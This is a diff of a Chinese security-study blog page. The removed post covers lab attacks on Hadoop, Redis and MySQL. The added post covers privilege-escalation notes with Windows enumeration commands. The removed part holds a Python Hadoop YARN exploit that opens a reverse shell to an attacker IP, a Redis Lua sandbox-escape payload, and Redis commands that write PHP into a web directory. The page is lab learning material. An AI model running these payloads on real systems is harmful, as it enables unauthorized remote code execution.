@@ -14,26 +14,19 @@
   
   <meta name="theme-color" content="#2f4154">
   <meta name="author" content="D4wn">
-  <meta name="keywords" content="服务攻防,数据库安全,Redis，Hadoop,Mysql,未授权访问,RCE">
+  <meta name="keywords" content="">
   
-    <meta name="description" content="服务攻防-数据库安全&amp;Redis&amp;Hadoop&amp;Mysql&amp;未授权访问&amp;RCE-55前置知识服务攻防大致流程：     服务开放了 扫描到的端口没开放:  端口修改了 只能内网访问 防护应用  Hadoop靶场:https:&#x2F;&#x2F;vulfocus.cn 123456789101112131415161718192021222324import requests">
+    <meta name="description" content="提权在Linux中 管理员UID&#x3D;0 系统用户UID：1~999 普通用户UID从1000开始 第三方应用或者插件都可以作为一个权限提升的途径 Web权限以Redis为例 1234config set dir &#x2F;home&#x2F;wwwroot&#x2F;default # 设置web写入目录config set dbfilename test.php # 设置写入文件名set test &quot;&amp;l">
 <meta property="og:type" content="article">
-<meta property="og:title" content="服务攻防-数据库安全&amp;Redis&amp;Hadoop&amp;Mysql&amp;未授权访问&amp;RCE-55">
-<meta property="og:url" content="https://d4wnnn.github.io/2022/10/02/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE-55/index.html">
+<meta property="og:title" content="提权">
+<meta property="og:url" content="https://d4wnnn.github.io/2022/12/28/%E6%8F%90%E6%9D%83/index.html">
 <meta property="og:site_name" content="D4wn">
-<meta property="og:description" content="服务攻防-数据库安全&amp;Redis&amp;Hadoop&amp;Mysql&amp;未授权访问&amp;RCE-55前置知识服务攻防大致流程：     服务开放了 扫描到的端口没开放:  端口修改了 只能内网访问 防护应用  Hadoop靶场:https:&#x2F;&#x2F;vulfocus.cn 123456789101112131415161718192021222324import requests">
+<meta property="og:description" content="提权在Linux中 管理员UID&#x3D;0 系统用户UID：1~999 普通用户UID从1000开始 第三方应用或者插件都可以作为一个权限提升的途径 Web权限以Redis为例 1234config set dir &#x2F;home&#x2F;wwwroot&#x2F;default # 设置web写入目录config set dbfilename test.php # 设置写入文件名set test &quot;&amp;l">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://source.unsplash.com/user/erondu/1600x900">
-<meta property="article:published_time" content="2022-10-02T08:52:50.000Z">
-<meta property="article:modified_time" content="2022-10-05T17:29:29.043Z">
+<meta property="article:published_time" content="2022-12-28T14:36:42.000Z">
+<meta property="article:modified_time" content="2022-12-30T02:14:12.795Z">
 <meta property="article:author" content="D4wn">
-<meta property="article:tag" content="服务攻防">
-<meta property="article:tag" content="数据库安全">
-<meta property="article:tag" content="Redis">
-<meta property="article:tag" content="Hadoop">
-<meta property="article:tag" content="Mysql">
-<meta property="article:tag" content="未授权访问">
-<meta property="article:tag" content="RCE">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://source.unsplash.com/user/erondu/1600x900">
   
@@ -41,7 +34,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>服务攻防-数据库安全&amp;Redis&amp;Hadoop&amp;Mysql&amp;未授权访问&amp;RCE-55 - D4wn</title>
+  <title>提权 - D4wn</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -238,7 +231,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="服务攻防-数据库安全&amp;Redis&amp;Hadoop&amp;Mysql&amp;未授权访问&amp;RCE-55"></span>
+            <span id="subtitle" data-typed-text="提权"></span>
           
         </div>
 
@@ -254,8 +247,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-10-02 16:52" pubdate>
-          2022年10月2日 下午
+        <time datetime="2022-12-28 22:36" pubdate>
+          2022年12月28日 晚上
         </time>
       </span>
     
@@ -266,7 +259,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.8k 字
+          822 字
         
       </span>
     
@@ -277,7 +270,7 @@
         
         
         
-          16 分钟
+          7 分钟
         
       </span>
     
@@ -315,65 +308,60 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">服务攻防-数据库安全&amp;Redis&amp;Hadoop&amp;Mysql&amp;未授权访问&amp;RCE-55</h1>
+            <h1 style="display: none">提权</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="服务攻防-数据库安全-amp-Redis-amp-Hadoop-amp-Mysql-amp-未授权访问-amp-RCE-55"><a href="#服务攻防-数据库安全-amp-Redis-amp-Hadoop-amp-Mysql-amp-未授权访问-amp-RCE-55" class="headerlink" title="服务攻防-数据库安全&amp;Redis&amp;Hadoop&amp;Mysql&amp;未授权访问&amp;RCE-55"></a>服务攻防-数据库安全&amp;Redis&amp;Hadoop&amp;Mysql&amp;未授权访问&amp;RCE-55</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>服务攻防大致流程：</p>
-<p><img src="/2022/10/02/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE-55/image.png" srcset="/img/loading.gif" lazyload alt="image"></p>
-<p>   服务开放了 扫描到的端口没开放:</p>
-<ol>
-<li>端口修改了</li>
-<li>只能内网访问</li>
-<li>防护应用</li>
-</ol>
-<h2 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h2><p>靶场:<a target="_blank" rel="noopener" href="https://vulfocus.cn/">https://vulfocus.cn</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># Hadoop未授权访问exp</span><br><br><span class="hljs-comment"># --------------------------设置参数-----------------------------------------------------------------------------</span><br>target = <span class="hljs-string">&#x27;http://172.30.158.168:8088/&#x27;</span>  <span class="hljs-comment"># 靶机</span><br>lhost = <span class="hljs-string">&#x27;120.53.236.54&#x27;</span>  <span class="hljs-comment"># 攻击机</span><br>port = <span class="hljs-string">&#x27;8999&#x27;</span>  <span class="hljs-comment"># 监听shell端口</span><br><span class="hljs-comment"># -------------------------------------------------------------------------------------------------------</span><br>url = target + <span class="hljs-string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span><br>resp = requests.post(url)<br>app_id = resp.json()[<span class="hljs-string">&#x27;application-id&#x27;</span>]<br>url = target + <span class="hljs-string">&#x27;ws/v1/cluster/apps&#x27;</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;application-id&#x27;</span>: app_id,<br>    <span class="hljs-string">&#x27;application-name&#x27;</span>: <span class="hljs-string">&#x27;get-shell&#x27;</span>,<br>    <span class="hljs-string">&#x27;am-container-spec&#x27;</span>: &#123;<br>        <span class="hljs-string">&#x27;commands&#x27;</span>: &#123;<br>            <span class="hljs-string">f&#x27;command&#x27;</span>: <span class="hljs-string">f&#x27;/bin/bash -i &gt;&amp; /dev/tcp/<span class="hljs-subst">&#123;lhost&#125;</span>/<span class="hljs-subst">&#123;port&#125;</span> 0&gt;&amp;1&#x27;</span>,<br>        &#125;,<br>    &#125;,<br>    <span class="hljs-string">&#x27;application-type&#x27;</span>: <span class="hljs-string">&#x27;YARN&#x27;</span>,<br>&#125;<br>requests.post(url, json=data)<br></code></pre></td></tr></table></figure>
+                <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>在Linux中</p>
+<p>管理员UID&#x3D;0</p>
+<p>系统用户UID：1~999</p>
+<p>普通用户UID从1000开始</p>
+<p>第三方应用或者插件都可以作为一个权限提升的途径</p>
+<h2 id="Web权限"><a href="#Web权限" class="headerlink" title="Web权限"></a>Web权限</h2><p>以Redis为例</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">config set dir /home/wwwroot/default # 设置web写入目录<br>config set dbfilename test.php # 设置写入文件名<br>set test &quot;&lt;?php phpinfo(); ?&gt;&quot; # 设置写入文件代码<br>bgsave #保存执行<br></code></pre></td></tr></table></figure>
 
-<h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p> 漏洞：</p>
+<p>java jsp类的统一是root权限</p>
+<h2 id="系统权限"><a href="#系统权限" class="headerlink" title="系统权限"></a>系统权限</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>默认情况下，系统为用户分了7个组</p>
 <ol>
-<li><p>未授权访问</p>
-<p>应用条件:</p>
-<ol>
-<li>bind 127.0.0.1 处于注释状态</li>
-<li>protected-mode no</li>
-<li>requirepass 处于注释状态</li>
+<li>管理员组Administrators</li>
+<li>高权限用户组Power Users</li>
+<li>普通用户组Users</li>
+<li>备份操作组Backup Operators</li>
+<li>文件复制组Replicator</li>
+<li>来宾用户组Guests</li>
+<li>身份验证组Authenticated Users</li>
 </ol>
+<p>其中文件复制组和备份文件组为维护系统而设置，平时很少使用</p>
+<p>除了上面七个默认权限分组，系统还存在一些特殊权限成员</p>
+<ol>
+<li><p>系统System</p>
 </li>
-<li><p>沙箱绕过</p>
-<p>  攻击机:172.30.152.248</p>
-<p>  靶机:172.30.158.168</p>
-<p>exp:</p>
-<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">eval</span> &#x27;<span class="hljs-built_in">local</span> io_l = package.loadlib(<span class="hljs-string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="hljs-string">&quot;luaopen_io&quot;</span>); <span class="hljs-built_in">local</span> io = io_l(); <span class="hljs-built_in">local</span> f = io.popen(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-built_in">local</span> res = f:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*a&quot;</span>); f:<span class="hljs-built_in">close</span>(); <span class="hljs-built_in">return</span> res&#x27; <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/2022/10/02/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE-55/image-20221003104516314.png" srcset="/img/loading.gif" lazyload alt="image-20221003104516314"></p>
-<p><img src="/2022/10/02/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE-55/image-20221003104522419.png" srcset="/img/loading.gif" lazyload alt="image-20221003104522419"></p>
+<li><p>信任程序模块Trustedinstaller</p>
 </li>
-<li><p>写webshell</p>
-<p>应用条件:知道Web目录 并且可读写</p>
-<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">config set dir /tmp</span><br><span class="language-xml">config set dbfilename 1.php</span><br><span class="language-xml">set test &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml">bgsave # 保存执行</span><br><span class="language-xml">save # 保存执行</span><br><span class="language-xml">注意:部分目录没有读写权限</span><br></code></pre></td></tr></table></figure>
+<li><p>所有人Everyone</p>
+<p>任何人都能访问被赋予Everyone权限的文件</p>
 </li>
-<li><p>写定时任务反弹shell</p>
-</li>
-<li><p>写入登录秘钥</p>
-<p>首先服务器必须允许密钥登陆</p>
-<p>其次redis允许异地登录</p>
-<p>然后要以root账号启动</p>
-<p>protected-mode处于关闭状态</p>
-</li>
-<li><p>RCE自动化脚本</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p>
+<li><p>创建者Creator Owner</p>
+<p>被标记创建者权限的文件只有创建文件的用户才可访问</p>
+<p>但是一切文件访问权限可被System用户和管理员组成员忽略</p>
 </li>
 </ol>
-<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="CVE-2012-2122"><a href="#CVE-2012-2122" class="headerlink" title="CVE-2012-2122"></a>CVE-2012-2122</h3><p>爆破mysql理论可行 建议通过phpmyadmin爆破 是本地到本地的过程 </p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in `seq <span class="hljs-number">1</span> <span class="hljs-number">1000</span>`;do mysql -uroot -pwrong -h <span class="hljs-number">172.30.158.168</span> -P <span class="hljs-number">3306</span>;done<br></code></pre></td></tr></table></figure>
+<p>这些特殊成员不被任何内置用户组吸纳，完全独立</p>
+<p>常见命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell">systeminfo 打印系统信息<br>whoami/priv 当前用户权限<br>ipconfig/displaydns 当前dns缓存<br>net user 列出用户<br>net localgroup 列出用户组<br>net user UserName 列出用户信息<br>net localgroup <span class="hljs-built_in">Group</span> 列出用户组信息<br>ver 查看系统版本<br>tasklist /svc 查看进程信息和服务信息<br></code></pre></td></tr></table></figure>
 
-<p>攻击机:172.30.152.248</p>
-<p>靶机:172.30.158.168</p>
-<p><img src="/2022/10/02/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE-55/image-20221003103333793.png" srcset="/img/loading.gif" lazyload alt="image-20221003103333793"></p>
-<p><img src="/2022/10/02/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE-55/image-20221003103340860.png" srcset="/img/loading.gif" lazyload alt="image-20221003103340860"></p>
-
+<p>提权步骤</p>
+<ol>
+<li>信息搜集 版本 漏洞补丁 杀软 位数 网络 权限</li>
+<li>基于信息筛选漏洞</li>
+</ol>
+<ul>
+<li>溢出漏洞</li>
+<li>数据库提权</li>
+<li>第三方软件</li>
+</ul>
+<h2 id="域控权限"><a href="#域控权限" class="headerlink" title="域控权限"></a>域控权限</h2>
                 
               </div>
             
@@ -403,25 +391,6 @@
     </div>
   
   
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/">#服务攻防</a>
-      
-        <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/">#数据库安全</a>
-      
-        <a href="/tags/Redis/">#Redis</a>
-      
-        <a href="/tags/Hadoop/">#Hadoop</a>
-      
-        <a href="/tags/Mysql/">#Mysql</a>
-      
-        <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">#未授权访问</a>
-      
-        <a href="/tags/RCE/">#RCE</a>
-      
-    </div>
-  
 </div>
 
 
@@ -430,8 +399,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>服务攻防-数据库安全&amp;Redis&amp;Hadoop&amp;Mysql&amp;未授权访问&amp;RCE-55</div>
-      <div>https://d4wnnn.github.io/2022/10/02/服务攻防-数据库安全-Redis-Hadoop-Mysql-未授权访问-RCE-55/</div>
+      <div>提权</div>
+      <div>https://d4wnnn.github.io/2022/12/28/提权/</div>
     </div>
     <div class="license-meta">
       
@@ -443,7 +412,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年10月2日</div>
+          <div>2022年12月28日</div>
         </div>
       
       
@@ -481,9 +450,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/10/02/hexo%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE/" title="hexo博客配置">
+                      <a href="/2022/12/29/Redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="Redis漏洞总结">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">hexo博客配置</span>
+                        <span class="hidden-mobile">Redis漏洞总结</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -491,8 +460,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/10/02/argparse%E6%A8%A1%E5%9D%97%E5%AD%A6%E4%B9%A0/" title="argparse模块学习">
-                        <span class="hidden-mobile">argparse模块学习</span>
+                      <a href="/2022/12/28/%E5%89%8D%E7%AB%AF/" title="前端">
+                        <span class="hidden-mobile">前端</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
